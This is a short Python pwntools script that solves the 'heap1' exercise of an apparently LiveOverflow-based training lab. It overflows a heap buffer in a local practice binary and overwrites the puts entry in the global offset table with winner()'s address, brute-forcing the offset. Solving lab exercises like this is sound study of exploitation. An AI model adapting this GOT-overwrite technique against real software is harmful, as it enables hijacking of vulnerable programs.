#!/usr/bin/env python3

from __future__ import annotations

import sys
from pathlib import Path

from pwn import ELF, log, p32, process

sys.path.append(str(Path(__file__).resolve().parents[1]))
from pwn_solve import set_pwn_context  # noqa: E402


SUCCESS = b"and we have a winner"


def main() -> int:
    set_pwn_context()

    # Binary is expected to be prebuilt (inside liveoverflow-pwn) and shared via volume.
    prog = str(Path(__file__).resolve().with_name("heap1"))
    elf = ELF(prog)

    winner = elf.symbols.get("winner")
    if not winner:
        log.failure("winner() not found")
        return 2

    puts_got = elf.got.get("puts")
    if not puts_got:
        log.failure("puts@GOT not found")
        return 2

    # Layout is allocator-dependent; brute a small window around the expected offset.
    for off in range(8, 64):
        arg1 = b"A" * off + p32(puts_got)
        arg2 = p32(winner)
        io = process([prog, arg1, arg2])
        out = io.recvall(timeout=2)
        if SUCCESS in out:
            log.success("heap1 solved (off=%d)", off)
            return 0
    log.failure("heap1 failed in range")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
